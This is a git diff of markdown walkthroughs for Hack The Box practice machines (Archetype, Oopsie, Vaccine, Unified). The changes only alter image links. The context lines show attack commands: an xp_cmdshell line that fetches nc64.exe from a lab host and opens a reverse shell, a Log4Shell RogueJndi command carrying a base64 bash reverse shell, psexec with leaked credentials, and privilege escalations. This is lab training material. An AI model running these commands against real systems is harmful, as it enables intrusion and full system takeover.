@@ -122,7 +122,7 @@ Connect via:
 python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127
 ```
 
-![mssqlclient](images/mssqlclient.png#center)
+![mssqlclient](images/mssqlclient.png)
 
 Then I used the [previous link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) as well as this [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) for `sql` commands. Generating command execution seems good:
 
@@ -135,7 +135,7 @@ RECONFIGURE; — priv
 ```
 
 And we have command execution:
-![shell](images/shell.png#center)
+![shell](images/shell.png)
 
 Then I tried several one-liner reverse shells for powershell, but didn't have any luck. So, I reverted back to the `netcat` binary ([nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)) to spin up a reverse shell.
 
@@ -155,7 +155,7 @@ Download the binary and run:
 xp_cmdshell "powershell.exe cd c:\Users\Public; wget http://10.10.14.232:8000/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe 10.10.14.232 1337"
 ```
 
-![rs](images/rs.png#center)
+![rs](images/rs.png)
 
 After a bit of poking around, I found this:
 
@@ -186,7 +186,7 @@ As I was scrolling through the output, a few things stood out:
   Hash: sql_svc::ARCHETYPE:1122334455667788:947576aa2fadb0cbbee6e345caee3fc6:0101000000000000ec105ee002efd8013a4c4936e65e1a2e0000000008003000300000000000000000000000003000004961ea35a68c9880c3eabe5d1edabb04866d05ca16c6fe9706906f3be985311d0a00100000000000000000000000000000000000090000000000000000000000 
 ```
 
-![winpeas](images/winpeas.png#center)
+![winpeas](images/winpeas.png)
 
 I decided to check the console history first:
 
@@ -206,7 +206,7 @@ Now we can revert back to `impacket` tools and use `psexec.py`:
 python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.91.127
 ```
 
-![root](images/root.png#center)
+![root](images/root.png)
 
 Finally, print out the flag.
 
@@ -306,17 +306,17 @@ sudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-C
 
 I tried some basic usernames and passwords, but no luck. Let's just login as a guest for now:
 
-![guest](images/guest.png#center)
+![guest](images/guest.png)
 
 Looks like the website is using `php`. Also, if we change the `id` in the url, we are able to change the `Account`, `Branding`, and `Clients` tab output. My first thought was to check the cookies to see if we can't edit something.
 
-![upload](images/upload.png#center)
+![upload](images/upload.png)
 
 Combining these ideas of the cookies and the `id`, I quickly unlocked the `Uploads` tab. I guess upload a `php` [reverse shell](https://github.com/pentestmonkey/php-reverse-shell).
 
 Now to find where this file was uploaded, and how to run it. `/uploads` seems like a plausible place to look (we saw this from our first scan).
 
-![php-rs](images/php-rs.png#center)
+![php-rs](images/php-rs.png)
 
 Flag is found in `/home/robert/user.txt`
 
@@ -355,7 +355,7 @@ Time for [`linpeas`](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS
 
 On the first look through, the `bugtracker` group stood out - especially since there is an unknown `SUID` (Set owner User ID) binary called `/usr/bin/bugtracker`. 
 
-![linpeas](images/linpeas.png#center)
+![linpeas](images/linpeas.png)
 
 `ltrace` is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.
 
@@ -364,11 +364,11 @@ ltrace /usr/bin/bugtracker
 ```
 The above command gives us the output:
 
-![ltrace](images/ltrace.png#center)
+![ltrace](images/ltrace.png)
 
 Since `system("cat...")` is being run, we can simply update the `$path` environment variable to point to point to our own malicious `cat` such as a `/bin/sh` shell that will keep the admin privileges. Like so:
 
-![oopsie](images/oopsie.png#center)
+![oopsie](images/oopsie.png)
 
 ### Questions
 - With what kind of tool can intercept web traffic? `proxy`
@@ -447,7 +447,7 @@ backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
 
 Taking a look into `index.php` gives us some password information:
 
-![index.php](images/index.php.png#center)
+![index.php](images/index.php.png)
 
 ```txt
 hash_md5(???) = "2cb42f8734ea607eefed3b70af13bbd3"
@@ -458,11 +458,11 @@ hash_md5(???) = "2cb42f8734ea607eefed3b70af13bbd3"
 ### http
 `http` is also open, so it is likely they have a website. 
 
-![login](images/login.png#center)
+![login](images/login.png)
 
 Now lets try the credentials we found `admin:qwerty789`
 
-![qwerty](images/qwerty.png#center)
+![qwerty](images/qwerty.png)
 
 After looking around, the only thing that seemed potentially vulnerable on the webpage was the `search` feature. This could be injectable via `sqlmap`. I first threw the website into `burpsuite`, copied the `GET` request of the search, and then saved this to a file called `get.request`.
 
@@ -470,7 +470,7 @@ After looking around, the only thing that seemed potentially vulnerable on the w
 sqlmap -r get.request -p search
 ```
 
-![sqlmap](images/sqlmap.png#center)
+![sqlmap](images/sqlmap.png)
 
 From here, I started looking around the databases.
 
@@ -478,11 +478,11 @@ From here, I started looking around the databases.
 sqlmap -r get.request -p search --search -C 'password'
 ```
 
-![dbs](images/dbs.png#center)
+![dbs](images/dbs.png)
 
 There could be valuable columns in `pg_catalog`, but I noticed a command flag called `--os-shell` in `sqlmap`'s man pages. After running this I actually got a shell (even better)!
 
-![sqlshell](images/sqlshell.png#center)
+![sqlshell](images/sqlshell.png)
 
 Time for a reverse shell - I just found [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for bash.
 
@@ -508,7 +508,7 @@ When starting privesc, I found something valuable for `ssh` (Secure Shell).
 cd /; grep -R password
 ```
 
-![grep](images/grep.png#center)
+![grep](images/grep.png)
 
 Looks like we can now `ssh` into the server directly instead of hosting an unstable reverse shell.
 
@@ -517,13 +517,13 @@ ssh postgres@10.129.199.211`
 (P@s5w0rd!)
 ```
 
-![ssh](images/ssh.png#center)
+![ssh](images/ssh.png)
 
 
 ### privesc
 We can then try to escalate privs. Let's start with the basics like `id` and `sudo -l`
 
-![fail](images/fail.png#center)
+![fail](images/fail.png)
 
 Looks like we can edit `pg_hba.conf` with `sudo` privs by using `vi`. So I tried the [basic payload](https://gtfobins.github.io/gtfobins/vi/#sudo) to get a shell. 
 
@@ -538,7 +538,7 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 :shell
 ```
 
-![vaccine](images/vaccine.png#center)
+![vaccine](images/vaccine.png)
 
 ### Questions
 - Besides SSH and HTTP, what other service is hosted on this box? `ftp`
@@ -616,7 +616,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### http
 Going to `10.129.186.136:8080` redirects us to `10.129.186.136:8443` and shows a login page:
 
-![unifi](images/unifi.png#center)
+![unifi](images/unifi.png)
 
 After a quick search, I found that `Unifi 6.4.54` is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in an in-depth [post walk-through](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi). I simply followed this walk-through to get a reverse shell!
 
@@ -634,11 +634,11 @@ industry standard application protocol for accessing and maintaining distributed
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.25"
 ```
 
-![pwncat](images/pwncat.png#center)
+![pwncat](images/pwncat.png)
 
 From here, we can easily get the `user.txt`
 
-![user](images/user.png#center)
+![user](images/user.png)
 
 ### privesc
 The tutorial continues to discuss how to actually interact with `mongodb` in order to become an administrator and access the website. One way to do this is to update the `administrator` password already stored. This is done by:
@@ -657,7 +657,7 @@ Looking through the `ace` database for the `administrator` user.
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
 
-![db](images/db.png#center)
+![db](images/db.png)
 
 To update `administrator`'s password to `unified`, we simply need to run:
 
@@ -665,12 +665,12 @@ To update `administrator`'s password to `unified`, we simply need to run:
 mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$dDywalcPwNgl3LkM$Ex3SObZFkVQ5kMk4Cmur7I9qDDKOyLNLrYbHGqt0JGz49G8fRb9KIAvFMS3AS8jGuOU/4nY5H5OtNq9/Qmpl1"}})'
 ```
 
-![admin](images/admin.png#center)
+![admin](images/admin.png)
 Bingo! `administrator:unified` got us in!
 
 And under settings there's some valuable information!
 
-![yes](images/yes.png#center)
+![yes](images/yes.png)
 
 `root:NotACrackablePassword4U2022`
 
